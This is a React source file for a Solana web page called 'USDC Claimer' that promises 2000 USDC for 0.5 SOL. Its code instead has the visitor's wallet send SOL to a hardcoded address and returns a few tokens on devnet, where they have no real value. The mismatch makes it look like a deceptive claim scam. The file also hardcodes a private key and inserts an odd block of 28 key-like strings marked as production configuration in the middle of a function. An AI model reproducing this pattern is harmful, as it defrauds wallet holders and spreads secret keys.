/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3WNH2Svj2imGeEysVAryQfN65tRp2SPAt131wFvFvvmDn2cL7Eo13C6pE5tcaCrYpdArdHdQRC7hpLLMmcqWPhHc"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5HHYbQffEfj8DxjFwTHhRTobhTXTi7HGnWGNeHGLn3cJY1QyHXCjhBTySB7DmWyqFMZyQBNgZiGjwBp333g4t9R8",
  "key1": "3RUMw1RDFugWozec3JSsU9ZeLStX2aEnQNVrDjjtdTxvGmKJ37fksLogtk28Hc3ev9gvnvwm7ampeS5XVMFqtqXy",
  "key2": "3SfiThzqcnFEQ8NYDDSDWvr8bkt6gungntNreFyBkoEPLD5qLqp8JDeJbE23t4bYYqiDbTngbm7JWXfCwtHFDzs1",
  "key3": "624gqpufGYg5Cm3dZBBnGq6CdpMv9jhjQkLwrV2YZtw9GEKmD1ADuZU68sdKbA5pQYgaHbYiZGK42ToZkzjEZTEf",
  "key4": "5p2UK1scqqG5v8Bu2eVgRrg3PK1UW2hX77HutLy4FxFZmpuufPMfK1ecbiogW8ZFbQZ1ztJwhiPyVsgnY24Xq6Yf",
  "key5": "cpqgT7JqmkLWX57kpdyHqxR4o2R9F2VcfT4D69GypWKrAZc5YvWQmKqHCb2x5fJbAztALKk1FQYuZPsqemtro5z",
  "key6": "5rDmoDfaAWNytqxVhPV5VqcMQFMqBEdkEHScVATY8iVDKUeET2vZqVkVw6LPtXndNmAYQj2uUEPbYrsanvs4hSBm",
  "key7": "3YA4eC8m2y3vjjDicfntfSaPFua38o6VdCHZTby9mChPkPpcckjShozeAYRg9HjbiJ2WH4ea7DTetQoTzRGRf2fM",
  "key8": "2SK2qDzL2eEgnfR4ZRGT2nBdA5j3xDXJ3g7PhVYLHViCNwZB9qWvvfr8MMQWzAwgE3KfqRYZ65rByB6fBEQ8Rp78",
  "key9": "44FFSY8gsLydysij7LZfUrhzqoWf3U6YBcM4Rd7s7GvMgXNSya9wDXaF62CtBGhRd44syV3QrK5S4KiWHtKiKRY3",
  "key10": "2FJJqe8TjwxGRB8yzo8x7pres5f2jsyuMnQHWEe97A3sPznUZh7KK2iHgR3vH9JGayVteXy56aMGdBtkkPzCr83q",
  "key11": "41VaCikSaYS3H118anZVGgxPfGRhjrD6TGZucMtPowV8gRnT8aWdALksttfByYKtoyxYK6iGcqufpMaTFDcp7bKA",
  "key12": "3XdunApVME28YwVzhLdEdKtskzEV9RHTkhdyCQmDrPdzyy8FfpMejtXSU5vJBTws8rHVp8x6WjNbpJ6CSgApyTit",
  "key13": "3VkVFt7Cp2FjTF7cZHMgRKZTz7xGepYuUZ8B536CsXxrCVyALBnURSMrFzFfPrFMyfbbxYfX6UN9ESaEb6TLJmFj",
  "key14": "63UL9H5VMQLfcUn8KkWhv2b3QDz16QYXo38hnLh5nqsMWTfoCorEpdgK2rTZDMaGVBLLR92ZvnrZruP8EXqpBhXv",
  "key15": "3LAh77xsZmSN4FEY5XTzHtZd6e2C6tpBujWVrjYq3rzZZBNd2H6QzuQrnYAcY4NTVsazzPMNMdQV6NygtgJx6wED",
  "key16": "3VY7KnnnXoBWzKs5d3zcU5TzejseVz6mgdJ6SvPBZfixGKQbgXtN5EeZ4gvErES3eEMqSsU1N4vc8ChLiea3pXxq",
  "key17": "LpQmgrCi4ciSiifFLvkGSH17DNeZBZAVXksxeu4rJkUQ3vki66Z7pKoAdd28LGZ7tTmdJQVvGTG7jN3Kx79LRXw",
  "key18": "4xrhvKGVqnHQ3jJRFhehk5Y7aN3VwZfiiknFwZFFekN2aaoQNNfzVDLQ8j1TYrVRw6HVYgDCRc3TEtAZdeNXLpJo",
  "key19": "2okVGdiUJ7RsRu2aKsecxrHbR2t15HQeYQwjusFxFhX6tjETfnY3nKTSHhA4C519sHMvQeyAMnMKzt3opiY6ENvE",
  "key20": "577BLeXeew79wQC5Qx6KVn3tpyqcniXZDknwMB3SmEucEPsSqN8LUoank7oVD8DuWDngMy6otPAy9xEJayBFnjtj",
  "key21": "2u7hqJ7Zgw99jTXY7ZC8uQywJjfcEBeZnS9GKtc9hbsBJiurm9DpDsAuUHWdh6R8eqXrUqsq8bcxTxu5y6bGzQdn",
  "key22": "RdBzRiQpbLKc7AKTEAV2KBPorp3gbe3KKBvEQM26VkacpPAr46JXd3Jm3dAZZNs5di43ocjsGqLyqiMN62aVy35",
  "key23": "3UYrrFDNaNKejU3Yzzzucr7SohsMmYZ3qLtRZGCwGVVakTZnVF8qjBqEPZogce5DezTSUnrjrHPEJRhCRR3vW9xg",
  "key24": "4g1yboEZakiedFgRvmRMxyL16UySpHxErF7DFTnku3GViXpy793Vp9QFjfgUkz5sTkmqpK8xYFLi9A2nkkLamKDg",
  "key25": "2YzjRebPqWJK5v8HKoiNi4EuwV7TnUbtX4BCGyDdNg6rHKZpM4UhykMbQeXdN8SYgEqWfCgZhj93LitdazKZ5w2M",
  "key26": "2jZVUGmj1KNniVGahtFqWx6jZwdSzTZVSAmFymeKZfkTzk1R2Xtu7gn7NaZj1heq5UYh4KK3h79VkiK1YqMZWJXe",
  "key27": "4RUkV1ng2htjMWVydxTb3F8ffjjLHgbafoLYX5H26h9vWijKcL59h7iGRRhB1LAJA28YYCuFmmWUaHHx2yS81i4J"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
